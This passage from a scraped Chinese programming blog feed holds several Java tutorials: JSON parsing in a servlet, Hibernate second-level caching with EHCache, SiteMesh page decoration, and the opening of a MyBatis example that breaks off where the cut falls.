            //System.out.println(jsonObj.toString(4));  
            System.out.println("-----------------------------------------------");  
            readJSONString(req);  
        } catch (Exception e) {  
            e.printStackTrace();  
        }  
  
    }  
  
    /** 
     * 从客户端读取JSON串 
     * @param req 
     */  
    public void readJSONString(HttpServletRequest req) {  
        System.out.println("接收到客户端的JSON信息如下：");  
        JSONObject clientJSONObj;  
        try {  
            clientJSONObj = new JSONObject(req.getParameter("jsonStr"));  
  
            System.out.println(clientJSONObj.toString(4));  
            JSONArray addressbookArray = clientJSONObj.getJSONArray("addressbook");  
            for (int i = 0; i < addressbookArray.length(); i++) {  
                System.out.println("The" + " " + (i + 1) + " addressbook msg:");  
                JSONObject addressbookJSONObj = addressbookArray.getJSONObject(i);  
                JSONObject addressJSONObj = addressbookJSONObj.getJSONObject("address");  
                System.out.println("address-------");  
                System.out.println("           " + addressJSONObj.getString("city"));  
                System.out.println("           " + addressJSONObj.getString("street"));  
                System.out.println("           " + addressJSONObj.getString("zip"));  
                System.out.println("name----------");  
                System.out.println("           " + addressbookJSONObj.getString("name"));  
                System.out.println("phoneNumbers--");  
                JSONArray phoneNumbersArr = addressbookJSONObj  
                        .getJSONArray("phoneNumbers");  
                System.out.println("           " + phoneNumbersArr.getString(0));  
                System.out.println("           " + phoneNumbersArr.getString(1));  
                System.out.println();  
            }  
        } catch (JSONException e) {  
            e.printStackTrace();  
        }  
    }  
}  
 
          服务器后台打印：
{"addressbook": [    {        "address": {            "city": [                "Seattle, WA",                "changsha"            ],            "street": ["P.O BOX 54534"],            "zip": [42452]        },        "name": "Ann Michaels",        "phoneNumbers": [            "561-832-3180",            "531-133-9098"        ]    },    {        "address": {            "city": [                "Miami, FL",                "changsha"            ],            "street": ["53 Mullholand Drive"],            "zip": [72452]        },        "name": "Betty Carter",        "phoneNumbers": [            "541-322-1723",            "546-338-1100"        ]    }]}-----------------------------------------------接收到客户端的JSON信息如下：{"addressbook": [    {        "address": {            "city": "Seattle, WA",            "street": "P.O BOX 54534",            "zip": 42452        },        "name": "Ann Michaels",        "phoneNumbers": [            "561-832-3180",            "531-133-9098"        ]    },    {        "address": {            "city": "Miami, FL",            "street": "53 Mullholand Drive",            "zip": 72452        },        "name": "Betty Carter",        "phoneNumbers": [            "541-322-1723",            "546-338-1100"        ]    }]}The 1 addressbook msg:address-------           Seattle, WA           P.O BOX 54534           42452name----------           Ann MichaelsphoneNumbers--           561-832-3180           531-133-9098The 2 addressbook msg:address-------           Miami, FL           53 Mullholand Drive           72452name----------           Betty CarterphoneNumbers--           541-322-1723           546-338-1100
已有 2 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Hibernate缓存之EHCache, zz563143188.iteye.com.blog.1930936, Mon, 26 Aug 2013 13:34:39 +0800

copy http://sishuok.com/forum/posts/list/275.html#394
 
企业级项目实战(带源码)地址：http://zz563143188.iteye.com/blog/1825168
收集五年的开发资料及源码下载地址：  http://pan.baidu.com/share/link?shareid=3739316113&uk=4076915866#dir/path=%2Fstudy
演示项目源码请下载codeFactory20130321,lib20130321文件,
1、缓存：缓存是什么，解决什么问题？
位于速度相差较大的两种硬件/软件之间的，用于协调两者数据传输速度差异的结构，均可称之为 Cache。目的：让数据更接近于应用程序，协调速度不匹配，使访问速度更快
    高速缓存就是性能调优，不属于Hibernate等，属于独立产品或框架，可单独使用。
    常见缓存算法：
a)         LFU（Least Frequently Used）：最近不常被使用（命中率低），一定时间段内使用次数最少的
b)        LRU（Least Recently Used）：最近很少使用（LinkedHashMap），没有被使用时间最长的
c)        FIFO（First In First Out）：先进先出
2、缓存策略
1．对象缓存
2．查询缓存
3．页面缓存
1．动态页面缓存
2．Servlet缓存
3．页面片段缓存
3、缓存分类
Web缓存：
                         i.              浏览器缓存：ajax（在客户端缓存）、HTTP协议
                       ii.              代理服务器缓存
操作系统缓存：如用于减少磁盘操作
数据库缓存：
                         i.              结果缓存：
                       ii.              排序缓存
                      iii.              插入缓存
                     iv.              日志缓存
                       v.              ………………
应用程序缓存
                         i.              对象缓存
                       ii.              查询缓存
                      iii.              页面缓存
动态页面静态化：网页静态化、独立图片服务器
页面局部缓存：
请求回应缓存：
4、常见Java缓存框架
EHCache
OSCache
JBossCache
SwarmCache
Memcached：在大规模互联网应用下使用，可用于分布式环境，每秒支撑1.5万～2万次请求
Tokyo Tyrant：兼容memcached协议，可以持久化存储，支持故障切换，对缓存服务器有高可靠性要求可以使用，每秒支撑0.5万～0.8万次请求
Mongodb：nosql文档数据库，类似于缓存但持久化，适用于海量存储，读多写少。
5、通用缓存产品
 
6、基于Web应用的缓存应用场景：
 
7、Web应用系统存在哪些速度差异？
读文件系统      ->  读硬盘
读数据库内存    ->  读文件系统
读应用内存      ->  访问数据库服务器
读静态文件      ->  访问应用服务器
读浏览器缓存    ->  访问网站
 
   
8、缓存实战：
8.1、Web缓存
8.1.1、ajax缓存
8.1.2、HTTP协议
8.2、数据库缓存：
8.2.1、结果缓存
8.2.2、排序缓存
8.2.3、插入缓存
8.2.4、日志缓存
8.2.5、………………
8.3、应用程序缓存
8.3.1、对象缓存
8.3.2、查询缓存
8.3.3、页面缓存
8.3.3.1、动态页面静态化：网页静态化、独立图片服务器
8.3.3.2、页面局部缓存
8.3.3.3、请求回应缓存
8.4、ORM缓存
8.4.1、目的：
Hibernate缓存：使当前数据库状态的表示接近应用程序，要么在内存中，要么在应用程序服务器机器的磁盘上。高速缓存是数据的一个本地副本，处于应用程序和数据库之间，可用来避免数据库的命中。
8.4.2、避免数据库命中：
应用程序根据标识符到缓存查，有就返回，没有再去数据库.
8.4.3、ORM缓存分类
一级缓存、二级缓存
8.4.4、缓存范围
1、事务范围高速缓存，对应于一级缓存（单Session）
        2、过程（JVM）范围高速缓存，对应于二级缓存（单SessionFactory）
           3、集群范围高速缓存，对应于二级缓存（多SessionFactory）
8.4.5、缓存哪些数据
              1、很少改变的数据；
2、不重要的数据，如论坛帖子，无需实时的数据（站内信、邮件（如每隔15秒更新一次））；
              3、应用程序固有的而非共享的。
              4、读大于写有用
8.4.6、Hibernate缓存架构
   
 
Hibernate中的二级缓存是可插拔的。
Hibernate二级缓存支持对象缓存、集合缓存、查询结果集缓存，对于查询结果集缓存可选。
查询缓存：需要两个额外的物理高速缓存区域：一个用于存放查询的结果集；另一个用于存储表上次更新的时间戳
8.4.6.1、Hibernate二级缓存
  1、高速缓存策略和高速缓存提供程序
2、高速缓存策略
2.1、二级高速缓存是否启用
        2.2、高速缓存过期策略(LRU、LFU、FIFO)
        2.3、高速缓存的物理格式(内存、文件、集群)
2.4、并发策略
3、内建的并发策略
3.1、只读缓存：适用于从不改变的数据，只用于引用数据。如果你的应用程序只需读取一个持久化类的实例，而无需对其修改， 那么就可以对其进行只读缓存。这是最简单，也是实用性最好的方法。甚至在集群中，它也能完美地运作。
Ehcache：缓存那些只读的数据。
如果要修改一个只读缓存的数据，抛出Can't write to a readonly object。但允许新增。
 
3.2、读/写缓存：利用时间戳机制，维护读取提交隔离，并且只在非集群环境中可用。还是给主要用于读取的数据使用这种策略，因为在这种数据中防止并发事务中的废弃数据最为关键，极少情况用于更新。（内部通过锁保证顺序）
如果应用程序需要更新数据，那么使用读/写缓存 比较合适。 如果应用程序要求“序列化事务”的隔离级别（serializable transaction isolation level），那么就决不能使用这种缓存策略。 如果在JTA环境中使用缓存，你必须指定hibernate.transaction.manager_lookup_class属性的值， 通过它，Hibernate才能知道该应用程序中JTA的TransactionManager的具体策略。 在其它环境中，你必须保证在Session.close()、或Session.disconnect()调用前， 整个事务已经结束。 如果你想在集群环境中使用此策略，你必须保证底层的缓存实现支持锁定(locking)。Hibernate内置的缓存策略并不支持锁定功能。
Ehcache：缓存那些有时候更新的数据，维护读取提交隔离语义。如果数据库是可重复读取隔离级别，该并发策略也能维护这个语义。可重复读取隔离级别是并发更新的折中解决方案。内部通过锁实现，可能发生线程堵塞。一个异步的并发策略
 
    3.3、非严格读/写缓存：不提供高速缓存和数据库之间的一致性保证。如果有可能并发访问相同的实体，你应该配置一个足够短的超时时限。否则，则可能从高速缓存中读取废弃的数据。如果数据几乎不变（几小时、几天），并且废弃的数据不可能是关键的关注点，那就使用这种策略。（内部不通过锁保证顺序），
如果应用程序只偶尔需要更新数据（也就是说，两个事务同时更新同一记录的情况很不常见），也不需要十分严格的事务隔离， 那么比较适合使用非严格读/写缓存策略。如果在JTA环境中使用该策略， 你必须为其指定hibernate.transaction.manager_lookup_class属性的值， 在其它环境中，你必须保证在Session.close()、或Session.disconnect()调用前， 整个事务已经结束。
Ehcache：缓存那些有时候更新的数据，内部将不通过锁实现，如果并发访问一个条目不保证返回数据库中最新版本的数据，因此请配置超时时间。只依赖于缓存过期（超时）。一个异步的并发策略
 
    3.4、事务缓存：只可用于托管环境，如有必要，它还保证完全的事务隔离级别直到可重复读。给主要用于读取的数据使用这种策略，因为在这种数据中防止并发事务中的废弃数据最为关键，极少情况用于更新。
Hibernate的事务缓存策略提供了全事务的缓存支持， 例如对JBoss TreeCache的支持。这样的缓存只能用于JTA环境中，你必须指定 为其hibernate.transaction.manager_lookup_class属性。
一个异步的并发策略，需要底层支持。
 
 
4、选择高速缓存提供程序
 
 
8.4.6.2、高速缓存实战(ehcache)
8.4.6.2.1、全局配置(hibernate.cfg.xml)
<!-- 开启二级缓存 -->
<property name="hibernate.cache.use_second_level_cache">true</property>
<!-- 开启查询缓存 -->
<property name="hibernate.cache.use_query_cache">true</property>
<!-- 二级缓存区域名的前缀 -->
<!--<property name="hibernate.cache.region_prefix">h3test</property>-->
<!-- 高速缓存提供程序 -->
<property name="hibernate.cache.region.factory_class">
net.sf.ehcache.hibernate.EhCacheRegionFactory
</property>
<!-- 指定缓存配置文件位置 -->
<property name="hibernate.cache.provider_configuration_file_resource_path">
ehcache.xml
</property>
<!-- 强制Hibernate以更人性化的格式将数据存入二级缓存 -->
<property name="hibernate.cache.use_structured_entries">true</property>
 
<!-- Hibernate将收集有助于性能调节的统计数据 -->
<property name="hibernate.generate_statistics">true</property>
 
 
 
 
 
 
8.4.6.2.2、ehcache配置（ehcache.xml）
<?xml version="1.0" encoding="UTF-8"?>
<ehcache name="h3test">
   <defaultCache
      maxElementsInMemory="100"
      eternal="false"
      timeToIdleSeconds="1200"
      timeToLiveSeconds="1200"
      overflowToDisk="false">
    </defaultCache>
</ehcache>
 
 
 
 
 
8.4.6.2.3、实体只读缓存
1、修改FarmModel.hbm.xml,添加如下红色部分配置，表示实体缓存并只读
<hibernate-mapping>
    <class name="cn.javass.h3test.model.FarmModel" table="TBL_FARM">
        <cache usage="read-only"/>
    ……
</hibernate-mapping>
 
 
 
2、测试代码
public static void readonlyTest() {
      SessionFactory sf =
new Configuration().configure().buildSessionFactory();
       
      Session session1 = sf.openSession();
      Transaction t1 = session1.beginTransaction();
      //确保数据库中有标识符为1的FarmModel
      FarmModel farm = (FarmModel) session1.get(FarmModel.class, 1);
      //如果修改将报错，只读缓存不允许修改
      //farm.setName("aaa");
      t1.commit();
     session1.close();
       
       
      Session session2 = sf.openSession();
      Transaction t2 = session2.beginTransaction();
       
      farm = (FarmModel) session2.get(FarmModel.class, 1);
       
      t2.commit();
      session2.close();
      sf.close();
}
 
 
 
 
只读缓存不允许更新，将报错Can't write to a readonly object。
允许新增，新增记录不自动加到二级缓存中，需要再查询一次。
8.4.6.2.4、实体非严格读/写缓存
 
 
 
 
1、修改FarmModel.hbm.xml,添加如下红色部分配置，表示实体缓存并非严格读/写
<hibernate-mapping>
    <class name="cn.javass.h3test.model.FarmModel" table="TBL_FARM">
        <cache usage="nonstrict-read-write"/>
    ……
</hibernate-mapping>
 
 
 
 
2、测试代码
public static void nonstrictReadWriteTest () {
      SessionFactory sf =
new Configuration().configure().buildSessionFactory();
       
      Session session1 = sf.openSession();
      Transaction t1 = session1.beginTransaction();
      //确保数据库中有标识符为1的FarmModel
      FarmModel farm = (FarmModel) session1.get(FarmModel.class, 1);
      t1.commit();
     session1.close();
       
       
      Session session2 = sf.openSession();
      Transaction t2 = session2.beginTransaction();
       
      farm = (FarmModel) session2.get(FarmModel.class, 1);
       
      t2.commit();
      session2.close();
      sf.close();
}
 
 
允许更新，更新后缓存失效，需再查询一次。
允许新增，新增记录自动加到二级缓存中。
整个过程不加锁，不保证。
 
 
8.4.6.2.5、实体读/写缓存
1、修改FarmModel.hbm.xml,添加如下红色部分配置，表示实体缓存并读/写
<hibernate-mapping>
    <class name="cn.javass.h3test.model.FarmModel" table="TBL_FARM">
        <cache usage="read-write"/>
    ……
</hibernate-mapping>
 
 
 
 
2、测试代码
public static void readWriteTest() {
    SessionFactory sf =
new Configuration().configure().buildSessionFactory();
       
    Session session1 = sf.openSession();
    Transaction t1 = session1.beginTransaction();
    //确保数据库中有标识符为1的FarmModel
    FarmModel farm = (FarmModel) session1.get(FarmModel.class, 1);
    farm.setName("as");
    t1.commit();
    session1.close();
           
    Session session2 = sf.openSession();
    Transaction t2 = session2.beginTransaction();
    farm = (FarmModel) session2.get(FarmModel.class, 1);
    t2.commit();
    session2.close();
    sf.close();
}
 
 
允许更新，更新后自动同步到缓存。
允许新增，新增记录后自动同步到缓存。
保证read committed隔离级别及可重复读隔离级别（通过时间戳实现）
整个过程加锁，如果当前事务的时间戳早于二级缓存中的条目的时间戳，说明该条目已经被别的事务修改了，此时重新查询一次数据库，否则才使用缓存数据，因此保证可重复读隔离级别。
8.4.6.2.6、实体事务缓存
需要特定缓存的支持和JTA事务支持，此处不演示。
 
8.4.6.2.7、集合缓存
此处演示读/写缓存示例，其他自测
1、修改FarmModel.hbm.xml,添加如下红色部分配置，表示实体缓存并读/写
<hibernate-mapping>
    <class name="cn.javass.h3test.model.UserModel" table="TBL_USER">
        <cache usage="read-write" />
        <set name="farms" cascade="all" inverse="true" lazy="false">
            <cache usage="read-write"/>
            <key column="fk_user_id"/>
            <one-to-many class="cn.javass.h3test.model.FarmModel"/>
        </set>
    </class>
</hibernate-mapping>
 
 
 
2、测试代码
public static void collectionReadWriteTest() {
SessionFactory sf =
new Configuration().configure().buildSessionFactory();
       
    Session session1 = sf.openSession();
    Transaction t1 = session1.beginTransaction();
    //确保数据库中有标识符为118的UserModel
    UserModel user = (UserModel) session1.get(UserModel.class, 118);
    user.getFarms();
    t1.commit();
    session1.close();
       
    Session session2 = sf.openSession();
    Transaction t2 = session2.beginTransaction();
    user = (UserModel) session2.get(UserModel.class, 118);
    user.getFarms();
    t2.commit();
    session2.close();
    sf.close();
}
 
 
和实体并发策略有相同含义；
但集合缓存只缓存集合元素的标识符，在二级缓存中只存放相应实体的标识符，然后再通过标识符去二级缓存查找相应的实体最后组合为集合返回。
 
8.4.6.2.8、查询缓存
1、保证全局配置中有开启了查询缓存。
2、修改FarmModel.hbm.xml,添加如下红色部分配置，表示实体缓存并读/写
<hibernate-mapping>
    <class name="cn.javass.h3test.model.FarmModel" table="TBL_FARM">
        <cache usage="read-write"/>
    ……
</hibernate-mapping>
 
 
 
3、测试代码
public static void queryCacheTest() {
SessionFactory sf =
new Configuration().configure().buildSessionFactory();
    
Session session1 = sf.openSession();
    Transaction t1 = session1.beginTransaction();
    Query query = session1.createQuery("from FarmModel");
    //即使全局打开了查询缓存，此处也是必须的
    query.setCacheable(true);
    List<FarmModel> farmList = query.list();
    t1.commit();
    session1.close();
   
    Session session2 = sf.openSession();
    Transaction t2 = session2.beginTransaction();
    query = session2.createQuery("from FarmModel");
    //即使全局打开了查询缓存，此处也是必须的
    query.setCacheable(true);
    farmList = query.list();
    t2.commit();
    session2.close();
        sf.close();
}
 
 
 
 
和实体并发策略有相同含义；
和集合缓存类似，只缓存集合元素的标识符，在二级缓存中只存放相应实体的标识符，然后再通过标识符去二级缓存查找相应的实体最后组合为集合返回。
 
 
8.4.6.2.9、高速缓存区域
Hibernate在不同的高速缓存区域保存不同的类（实体）/集合，如果不配置区域默认都保存到“默认缓存”（defaultCache）中。
  每一个区域可以设置过期策略、缓存条目大小等等。
  对于类缓存，默认区域名是全限定类名，如cn.javass.h3test.model.UserModel。
  对于集合而言，默认区域名是全限定类名+属性名，如cn.javass.….UserModel.farms。
  可通过hibernate.cache.region_prefix指定特定SessionFactory的区域前缀，如前缀是h3test，则如类缓存的区域名就是h3test. cn.javass.h3test.model.UserModel。如果应用程序使用多个SessionFactory 这可能是必须的。
 
    可通过<cache usage="read-write" region="区域名"/>自定义区域名，不过默认其实就可以了。
 
8.4.6.2.10、ehcache配置详解：
1、默认cache：如果没有对应的特定区域的缓存，就使用默认缓存。
 
 
   <defaultCache
      maxElementsInMemory="100"
      eternal="false"
      timeToIdleSeconds="1200"
      timeToLiveSeconds="1200"
      overflowToDisk="false">
    </defaultCache>
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
2、指定区域cache：通过name指定，name对应到Hibernate中的区域名即可。
   <cache name="cn.javass.h3test.model.UserModel"
      maxElementsInMemory="100"
      eternal="false"
      timeToIdleSeconds="1200"
      timeToLiveSeconds="1200"
      overflowToDisk="false">
    </cache>
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
3、cache参数详解：
name:指定区域名
maxElementsInMemory ：缓存在内存中的最大数目
maxElementsOnDisk：缓存在磁盘上的最大数目
§           eternal ：缓存是否持久
§           overflowToDisk ： 硬盘溢出数目
§           timeToIdleSeconds ：当缓存条目闲置n秒后销毁
§           timeToLiveSeconds ：当缓存条目存活n秒后销毁
§           memoryStoreEvictionPolicy:缓存算法，有LRU（默认）、LFU、FIFO
 
4、StandardQueryCache
        用于查询缓存使用，如果指定了该缓存，那么查询缓存将放在该缓存中。
 
 
<cache
    name="org.hibernate.cache.StandardQueryCache"
    maxElementsInMemory="5"
    eternal="false"
    timeToLiveSeconds="120"
overflowToDisk="true"/>
 
 
 
 
 
 
 
 
 
 
如果不给查询设置区域名默认缓存到这，可以通过“query.setCacheRegion("区域名");”来设置查询的区域名。
 
5、UpdateTimestampsCache
    时间戳缓存，内部使用，用于保存最近更新的表的时间戳，这是非常重要的，无需失效，关闭时间戳缓存区域的过期时间。
<cache
    name="org.hibernate.cache.UpdateTimestampsCache"
    maxElementsInMemory="5000"
    eternal="true"
    overflowToDisk="true"/>
 
 
 
 
    Hibernate使用时间戳区域来决定被高速缓存的查询结果集是否是失效的。当你重新执行了一个启用了高速缓存的查询时，Hibernate就在时间戳缓存中查找对被查询的（几张）表所做的最近插入、更新或删除的时间戳。如果找到的时间戳晚于高速缓存查询结果的时间戳，那么缓存结果将被丢弃，重新执行一次查询。
 
8.4.6.2.11、什么时候需要查询缓存
  大多数时候无法从结果集高速缓存获益。必须知道:每隔多久重复执行同一查询。
  对于那些查询非常多但插入、删除、更新非常少的应用程序来说，查询缓存可提升性能。但写入到查询少的没有用，总失效。
 
8.4.6.2.12、管理一级缓存
无论何时，当你给save()、update()或 saveOrUpdate()方法传递一个对象时，或使用load()、 get()、list()、iterate() 或scroll()方法获得一个对象时, 该对象都将被加入到Session的内部缓存中。
当随后flush()方法被调用时，对象的状态会和数据库取得同步。 如果你不希望此同步操作发生，或者你正处理大量对象、需要对有效管理内存时，你可以调用evict() 方法，从一级缓存中去掉这些对象及其集合。
ScrollableResult cats = sess.createQuery("from Cat as cat").scroll(); //a huge result set
while ( cats.next() ) {
    Cat cat = (Cat) cats.get(0);
    doSomethingWithACat(cat);
    sess.evict(cat);
}
Session还提供了一个contains()方法，用来判断某个实例是否处于当前session的缓存中。
如若要把所有的对象从session缓存中彻底清除，则需要调用Session.clear()。
 
CacheMode参数用于控制具体的Session如何与二级缓存进行交互。
CacheMode.NORMAL - 从二级缓存中读、写数据。
CacheMode.GET - 从二级缓存中读取数据，仅在数据更新时对二级缓存写数据。
CacheMode.PUT - 仅向二级缓存写数据，但不从二级缓存中读数据。
CacheMode.REFRESH - 仅向二级缓存写数据，但不从二级缓存中读数据。通过 hibernate.cache.use_minimal_puts的设置，强制二级缓存从数据库中读取数据，刷新缓存内容。
 
8.4.6.2.12、管理二级缓存
对于二级缓存来说，在SessionFactory中定义了许多方法， 清除缓存中实例、整个类、集合实例或者整个集合。
sessionFactory.evict(Cat.class, catId); //evict a particular Cat
sessionFactory.evict(Cat.class);  //evict all Cats
sessionFactory.evictCollection("Cat.kittens", catId); //evict a particular collection of kittens
sessionFactory.evictCollection("Cat.kittens"); //evict all kitten collections
sessionFactory.evictQueries()//evict all queries
8.4.6.2.13、监控二级缓存
如若需要查看二级缓存或查询缓存区域的内容，你可以使用统计（Statistics） API。
通过sessionFactory.getStatistics()；获取Hibernate统计信息。
此时，你必须手工打开统计选项。
hibernate.generate_statistics true
hibernate.cache.use_structured_entries true
 
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
SiteMesh小例子及详细介绍, zz563143188.iteye.com.blog.1930933, Mon, 26 Aug 2013 13:30:11 +0800

企业级项目实战(带源码)地址：http://zz563143188.iteye.com/blog/1825168
收集五年的开发资料及源码下载地址：  http://pan.baidu.com/share/link?shareid=3739316113&uk=4076915866#dir/path=%2Fstudy
演示项目源码请下载codeFactory20130321,lib20130321文件,
 
一、SiteMesh项目简介       OS(OpenSymphony)的SiteMesh是一个用来在JSP中实现页面布局和装饰（layout and decoration） 的框架组件，能够帮助网站开发人员较容易实现页面中动态内容和静态装饰外观的分离。        Sitemesh是由一个基于Web页面布局、装饰以及与现存Web应用整合的框架。它能帮助我们在由大 量页面构成的项目中创建一致的页面布局和外观，如一致的导航条，一致的banner，一致的版权，等等。 它不仅仅能处理动态的内容，如jsp，php，asp等产生的内容，它也能处理静态的内容，如htm的内容， 使得它的内容也符合你的页面结构的要求。甚至于它能将HTML文件象include那样将该文件作为一个面板 的形式嵌入到别的文件中去。所有的这些，都是GOF的Decorator模式的最生动的实现。尽管它是由java语言来实现的，但它能与其他Web应用很好地集成。        官方：http://www.opensymphony.com/sitemesh/        下载地址：http://www.opensymphony.com/sitemesh/download.action 目前的最新版本是Version 2.3； 二、为什么要使用SiteMesh?     我们的团队开发J2EE应用的时候，经常会碰到一个比较头疼的问题：          由于Web页面是由不同的人所开发，所以开发出来的界面通常是千奇百怪，通常让项目管理人员苦笑不得。      而实际上，任何一个项目都会要求界面的统一风格和美观，既然风格统一，那就说明UI层肯定有很多可以抽出来 共用的静态或动态部分；如何整合这些通用的静态或动态UI呢？Apache Tiles框架站了出来很好的解决了这一问题， 再加上他与struts的完美集成，导致大小项目都把他作为UI层的首选框架， 但是：    Tiles确实有着它很多的不足之处,下文我会介绍,本文想说的是，除了Apache Tiles框架,其实我们还有更好的解 决方案，那就是:SiteMesh； 本文       介绍了一个基于Web页面的布局、装饰以及应用整合的框架Sitemesh，它能帮助你为你的应用创建一致的外观， 很好的取代Apache Tiles; 三、SiteMesh VS Apache Tiles      用过struts的朋友应该对Apache Tiles的不会陌生，我曾经有一篇文章介绍过struts中tiles框架的组合与继承， 现在怎么看怎么觉得复杂;              从使用角度来看，Tiles似乎是Sitemesh标签<page:applyDecorator>的一个翻版。其实sitemesh最强的 一个特性是sitemesh将decorator模式用在过滤器上。任何需要被装饰的页面都不知道它要被谁装饰，所以它就 可以用来装璜来自php、asp、CGI等产生的页面了。你可以定义若干个装饰器，根据参数动态地选择装饰器， 产生动态的外观以满足你的需求。它也有一套功能强大的属性体系，它能帮助你构建功能强大而灵活的装饰器。 相比较而言，在这方面Tiles就逊色许多。        个人觉得在团队开发里面，Apache Tiles框架会导致所有人不仅仅要了解并且清楚Apache Tiles的存在， 并且要特别熟悉每一个Tiles layout模板的作用，否则就可能出现用错模板的情况；除此之外，每个人涉及到 的所有WEB页面都需要去配置文件里面逐个配置，不仅麻烦出错的几率还高；        而以上所有的不足都是SiteMesh所不存在的； 四、SiteMesh的基本原理       一个请求到服务器后，如果该请求需要sitemesh装饰，服务器先解释被请求的资源，然后根据配置文件 获得用于该请求的装饰器，最后用装饰器装饰被请求资源，将结果一同返回给客户端浏览器。 五、如何使用SiteMesh    这里以struts2+spring2+hibernate3构架的系统为例      1、下载SiteMesh           下载地址：http://www.opensymphony.com/sitemesh/download.action 目前的最新版本是Version 2.3；               2、在工程中引入SiteMesh的必要jar包，和struts2-sitemesh-plugin-2.0.8.jar；              3、修改你的web.xml,在里面加入sitemesh的过滤器，示例代码如下：          <!-- sitemesh配置 -->     <filter>         <filter-name>sitemesh</filter-name>         <filter-class>              com.opensymphony.module.sitemesh.filter.PageFilter         </filter-class>     </filter>     <filter-mapping>         <filter-name>sitemesh</filter-name>         <url-pattern>/*</url-pattern>     </filter-mapping>                注意过滤器的位置：应该在struts2的org.apache.struts2.dispatcher.FilterDispatcher过滤器之前org.apache.struts2.dispatcher.ActionContextCleanUp过滤器之后，否则会有问题；        4、在下载的SiteMesh包中找到sitemesh.xml，(/sitemesh-2.3/src/example-webapp/WEB-INF目录下就有)          将其拷贝到/WEB-INF目录下；        5、在sitemesh.xml文件中有一个property结点(如下)，该结点指定了decorators.xml在工程中的位置，让sitemesh.xml能找到他; 按照此路径新建decorators.xml文件，当然这个路径你可以任意改变，只要property结点的value值与其匹配就行； <property name="decorators-file" value="/WEB-INF/sitemesh/decorators.xml"/>           6、在WebRoot目录下新建decorators目录，并在该目录下新建一个模板jsp，根据具体项目风格编辑该模板， 如下示例：我的模板：main.jsp <%@ page language="java" pageEncoding="UTF-8"%> <%@taglib prefix="decorator"      uri="http://www.opensymphony.com/sitemesh/decorator"%> <%@taglib prefix="page" uri="http://www.opensymphony.com/sitemesh/page"%> <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> <%      response.setHeader("Pragma", "no-cache");      response.setHeader("Cache-Control", "no-cache");      response.setDateHeader("Expires", 0); %> <html>     <head>         <title><decorator:title default="kangxm test" />         </title>         <!-- 页面Head由引用模板的子页面来替换 -->         <decorator:head />     </head>     <body id="page-home">         <div id="page-total">             <div id="page-header">                 <table width="100%" border="0" cellspacing="0" cellpadding="0">                     <tr>                         <td>                             <div class="topFunc">                                  我的账户                                  |                                  退出                             </div>                         </td>                     </tr>                 </table>             </div>         </div>         <!-- end header -->         <!--   Menu Tag begin -->         <div id="page-menu" style="margin-top: 8px; margin-bottom: 8px;">             <div>                  这里放菜单             </div>         </div>         <!--   Menu Tag end -->         <div id="page-content" class="clearfix">             <center>                 <table width="100%" border="0" cellpadding="0" cellspacing="0">                     <tr>                         <td>                             <decorator:body /><!-- 这里的内容由引用模板的子页面来替换 -->                         </td>                     </tr>                 </table>             </center>         </div>         <!-- end content -->         <div id="page-footer" class="clearfix">              这里放页面底部             <!-- end footer -->         </div>         <!-- end page -->     </body> </html> 这就是个简单的模板，页面的头和脚都由模板里的静态HTML决定了，主页面区域用的是<decorator:body />标签； 也就是说凡是能进入过滤器的请求生成的页面都会默认加上模板上的头和脚，然后页面自身的内容将自动放到<decorator:body />标签所在位置； <decorator:title default="Welcome to test sitemesh!" />：读取被装饰页面的标题，并给出了默认标题。 <decorator:head />：读取被装饰页面的<head>中的内容； <decorator:body />：读取被装饰页面的<body>中的内容；       7、说到这里大家就要想了，那如果某个特殊的需求请求路径在过滤器的范围内，但又不想使用模板怎么办？ 你总不能这么不讲道理吧！          大家放心吧，SiteMesh早就考虑到这一点了，上面第5步说道的decorators.xml这个时候就起到作用了！         下面是我的decorators.xml： <?xml version="1.0" encoding="ISO-8859-1"?> <decorators defaultdir="/decorators">     <!-- Any urls that are excluded will never be decorated by Sitemesh -->     <excludes>         <pattern>/index.jsp*</pattern>           <pattern>/login/*</pattern>     </excludes>     <decorator name="main" page="main.jsp">         <pattern>/*</pattern>     </decorator> </decorators> decorators.xml有两个主要的结点：        decorator结点指定了模板的位置和文件名，通过pattern来指定哪些路径引用哪个模板        excludes结点则指定了哪些路径的请求不使用任何模板 如上面代码，/index.jsp和凡是以/login/开头的请求路径一律不使用模板； 另外还有一点要注意的是：decorators结点的defaultdir属性指定了模板文件存放的目录; 六、实战感受       刚刚做完一个用到sitemesh的项目，跟以前用tiles框架相比，最大的感受就是简单，系统设计阶段 就把模板文件和sitemesh框架搭好了！哪些页面使用框架哪些不使用，全部都通过UI Demo很快就定义出来了； 在接下来的开发中所有成员几乎感受不到sitemesh的存在，各自仅仅关心自己的模块功能实现； 七、总结     使用sitemesh给我们带来的是不仅仅是页面结构问题，它的出现让我们有更多的时间去关注底层业务 逻辑，而不是整个页面的风格和结构。它让我们摆脱了大量用include方式复用页面尴尬局面，也避免了tiles 框架在团队开发中的复杂度，它还提供了很大的灵活性以及给我们提供了整合异构Web系统页面的一种方案
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
MyBatis联合查询和修改例子, zz563143188.iteye.com.blog.1930932, Mon, 26 Aug 2013 13:28:07 +0800

copy http://blog.csdn.net/caodegao/article/details/6735049 
企业级项目实战(带源码)地址：http://zz563143188.iteye.com/blog/1825168
收集五年的开发资料及源码下载地址：  http://pan.baidu.com/share/link?shareid=3739316113&uk=4076915866#dir/path=%2Fstudy
演示项目源码请下载codeFactory20130321,lib20130321文件,
MyBatis现在还挺少人用的,刚玩的时候在网站查资料都没有很多贴研究它.走了很多弯路;
在此做了一个小例子,跟大家分享一下;
如果能对一些刚玩MyBatis的朋友一些帮助就再好不过了.
首先给大家配置MyBatis的前奏,毕竟什么框架都是配置出来的,大家得下载MyBatis的文档,上面有很详细的配置前奏.
我就不给大家贴出来了.我是用Spring和Struts2集成的.别怪我太自私啊!下次慢慢在贴出集成的例子,
 
先给大家sql的配置吧
我有一个总文件mybatis-config.xml,在总文件加载子文件,这样至少分工还算明细些.
